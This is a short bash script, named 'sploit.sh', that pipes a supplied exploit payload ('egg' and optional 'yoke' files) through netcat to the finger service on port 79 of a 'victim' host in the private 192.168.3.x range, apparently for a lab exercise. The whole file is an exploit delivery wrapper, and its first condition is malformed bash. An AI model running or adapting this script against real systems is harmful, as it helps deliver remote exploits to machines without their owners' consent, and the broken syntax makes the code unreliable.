#!/bin/bash
IP="192.168.3."

if [[ $1 == "-h" ] || [ $# > 3 ]]; then
  echo "Usage: sploit.sh <victim #> <egg> [yoke]"
fi
if [[ $# == 2 ]]; then
  cat $2 - | nc $IP$1 79
fi
if [[ $# == 3 ]]; then
  cat $2 $3 - | nc $IP$1 79
fi
